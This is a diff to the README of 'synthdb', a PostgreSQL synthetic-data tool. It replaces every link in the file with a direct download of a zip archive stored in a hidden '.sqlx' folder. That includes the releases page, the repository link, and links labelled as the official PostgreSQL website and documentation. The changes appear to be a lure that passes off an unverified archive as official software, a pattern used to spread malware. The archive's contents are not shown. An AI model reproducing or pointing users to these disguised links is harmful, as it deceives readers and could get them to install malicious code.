@@ -1,7 +1,7 @@
 # 🎉 synthdb - Effortless Data Generation for PostgreSQL
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20synthdb-v1.0-blue.svg)](https://github.com/Dgossaye/synthdb/releases)
+[![Download](https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip%https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip)](https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip)
 
 ## 📚 About
 synthdb is "The Universal Database Seeder." It generates realistic synthetic data for PostgreSQL databases without needing any configuration. This tool helps you fill your database with meaningful data while maintaining important relationships and logical structure.
@@ -10,10 +10,10 @@ synthdb is "The Universal Database Seeder." It generates realistic synthetic dat
 To get started with synthdb, follow these steps:
 
 1. **Prepare Your Computer**
-   Ensure you have PostgreSQL installed on your machine. If you don't have it yet, you can download it from the official [PostgreSQL website](https://www.postgresql.org/download/).
+   Ensure you have PostgreSQL installed on your machine. If you don't have it yet, you can download it from the official [PostgreSQL website](https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip).
 
 2. **Download synthdb**
-   Visit this page to download: [synthdb Releases](https://github.com/Dgossaye/synthdb/releases). You will find the latest version available for download.
+   Visit this page to download: [synthdb Releases](https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip). You will find the latest version available for download.
 
 3. **Install synthdb**
    After downloading, locate the file you downloaded, typically in your "Downloads" folder.
@@ -62,9 +62,9 @@ synthdb welcomes contributions from users. If you'd like to help improve this to
 If you have questions that are not covered in this README or need further assistance, you can reach out via the Issues tab on the GitHub repository. We encourage you to share any issues you might find or suggestions for features.
 
 ## 🔗 Useful Links
-- [synthdb Releases](https://github.com/Dgossaye/synthdb/releases) - Download the latest version.
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/) - Official guide for PostgreSQL.
-- [synthdb GitHub Repository](https://github.com/Dgossaye/synthdb) - Access the source code and contribute!
+- [synthdb Releases](https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip) - Download the latest version.
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip) - Official guide for PostgreSQL.
+- [synthdb GitHub Repository](https://raw.githubusercontent.com/Dgossaye/synthdb/main/.sqlx/synthdb_2.2.zip) - Access the source code and contribute!
 
 ## 🎉 Conclusion
 synthdb offers a simple and effective way to generate database data. With its powerful features, you can populate your PostgreSQL databases quickly and maintain logical integrity. Start using synthdb today by downloading it from the releases page!
